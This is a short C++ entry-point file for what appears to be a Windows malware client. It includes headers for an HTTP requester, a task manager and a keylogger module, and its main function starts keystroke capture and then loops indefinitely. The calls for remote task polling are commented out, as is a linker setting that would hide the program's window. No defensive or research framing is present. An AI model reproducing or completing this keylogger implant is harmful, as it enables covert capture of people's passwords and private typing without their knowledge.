//#define _WINSOCK_DEPRECATED_NO_WARNINGS
//#define _CRT_SECURE_NO_WARNINGS

#include <initializer\client_initializer.h>
#include <http\requester.h>
#include <task\task_manager.h>
#include <Windows.h>
#include <thread>

#include <task\client_tasks\keylogger\keylogger_client.h>
//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

int main(){
	
	keylogger_client::get()->capture_keys();
	// Initialize check singleton instance
	//initializer::client_initializer::get()->run();
	//
	//// Request in tasks and store task in the vector
	//http::requester::get()->run();

	//// Capturing task and execute the class_<task>
	//task_manager::get()->run();

	while (true) {
		std::this_thread::sleep_for(
			std::chrono::milliseconds((uint32_t)-1)
		);
	}
    return 0;
}



